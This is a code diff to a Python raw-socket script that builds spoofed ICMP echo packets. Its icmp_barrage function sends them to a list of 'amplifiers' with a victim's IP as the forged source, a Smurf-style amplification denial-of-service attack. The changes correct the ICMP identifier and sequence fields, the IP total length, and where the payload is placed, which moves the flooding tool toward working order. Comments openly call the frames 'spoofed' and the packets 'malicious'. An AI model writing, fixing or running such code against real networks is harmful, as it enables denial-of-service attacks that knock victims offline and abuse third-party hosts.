@@ -1,3 +1,4 @@
+import os
 import socket
 import struct
 from sys import byteorder
@@ -17,30 +18,31 @@ def construct_ICMP_packet():
 	''' Construct the core ICMP payload '''
 	ping_type = 0x08
 	ping_code = 0x00
-	headers = 0x00
+	identifier = 0 #os.getpid() & 0xffff
+	sequence = 0
 	# serialize data with zeroed out checksum field
-	data = ping_type.to_bytes(1, byteorder) + ping_code.to_bytes(1, byteorder) + b'\x00\x00' + headers.to_bytes(4, byteorder)
+	data = ping_type.to_bytes(1, byteorder) + ping_code.to_bytes(1, byteorder) + b'\x00\x00' + identifier.to_bytes(2, byteorder) + sequence.to_bytes(2, byteorder)
 	# compute checksum
 	checksum = compute_checksum(data)
 	# serialize ICMP packet with computed checksum
-	return struct.pack("!BBHL", ping_type, ping_code, checksum, headers)
+	return struct.pack("!BBHHH", ping_type, ping_code, checksum, identifier, sequence)
 
-def construct_IP_packet(src, dest):
+def construct_IP_packet(src, dest, icmp):
 	''' Construct an IPv4 packet '''
 	# FIXME fill in IP packet address fields dynamically and compute checksum
 	v_ihl = 0x45 # set version number to 4 (IPv4) # set ihl value to 5 (no options field included)
 	tos = 0x00
-	length = 0x14 # let length be filled in by kernel
-	ident = 0x00 # set packet identity number
+	length = 0x1c
+	ident = os.getpid() & 0xffff
 	flags = 0x00
 	ttl = 0xff # ttl set to max lifetime of 255
 	protocol = 0x01 # set to IP protocol 1 (ICMP)
 	header_chksm = 0x00 # compute header checksum
 	source_ip = socket.inet_aton(src)
 	dest_ip = socket.inet_aton(dest)
-	serialized = v_ihl.to_bytes(1, byteorder) + tos.to_bytes(1, byteorder) + length.to_bytes(2, byteorder) + ident.to_bytes(2, byteorder) + flags.to_bytes(2, byteorder) + ttl.to_bytes(1, byteorder) + protocol.to_bytes(1, byteorder) + header_chksm.to_bytes(2, byteorder) + source_ip + dest_ip
+	serialized = v_ihl.to_bytes(1, byteorder) + tos.to_bytes(1, byteorder) + length.to_bytes(2, byteorder) + ident.to_bytes(2, byteorder) + flags.to_bytes(2, byteorder) + ttl.to_bytes(1, byteorder) + protocol.to_bytes(1, byteorder) + header_chksm.to_bytes(2, byteorder) + source_ip + dest_ip + icmp
 	checksum = compute_checksum(serialized)
-	return struct.pack('!BBHHHBBH4s4s', v_ihl, tos, length, ident, flags, ttl, protocol, checksum, source_ip, dest_ip)
+	return struct.pack('!BBHHHBBH4s4s', v_ihl, tos, length, ident, flags, ttl, protocol, checksum, source_ip, dest_ip) + icmp
 
 
 def construct_ETH_packet(src, dest):
@@ -67,11 +69,11 @@ def icmp_barrage(target, target_mac, amplifiers, amplifier_macs):
 	# iterate through amplifiers
 	for idx, dest in enumerate(amplifiers):
 		# craft an IP packet with the victim's source IP and amplifier's destination IP
-		ip_packet = construct_IP_packet(target, dest)
+		ip_packet = construct_IP_packet(target, dest, icmp_payload)
 		# construct spoofed ethernet 2 frame
 		ether = construct_ETH_packet(target_mac, amplifier_macs[idx])
 		# append ICMP payload to IP header
-		packet = ether + ip_packet + icmp_payload
+		packet = ether + ip_packet
 		checksum = crc32(packet)
 		packet += checksum.to_bytes(4, byteorder)
 		# send malicious packet to the amplifier
